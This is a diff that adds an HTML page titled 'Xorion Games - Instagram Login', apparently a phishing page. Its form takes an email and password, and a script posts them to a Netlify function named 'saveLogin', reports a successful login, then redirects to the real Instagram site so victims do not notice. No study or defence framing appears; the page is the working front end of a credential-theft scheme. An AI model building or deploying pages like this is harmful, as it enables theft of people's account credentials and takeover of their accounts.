@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xorion Games - Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="login-card">
+            <h1 class="logo">Xorion Games</h1>
+            <form class="login-form" name="login" data-netlify="true" action="/.netlify/functions/saveLogin" method="POST">
+                <div class="input-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit" class="btn">Log In</button>
+            </form>
+            <div class="signup-link">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Handle success or failure after form submission
+        const loginForm = document.querySelector('.login-form');
+        loginForm.addEventListener('submit', (event) => {
+            event.preventDefault();
+            const formData = new FormData(loginForm);
+            const data = Object.fromEntries(formData);
+            
+            fetch('/.netlify/functions/saveLogin', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Logged in successfully!');
+                    window.location.href = 'https://www.instagram.com';  // Redirect to Instagram
+                } else {
+                    alert('Login failed. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error processing your request.');
+            });
+        });
+    </script>
+
+</body>
+</html>
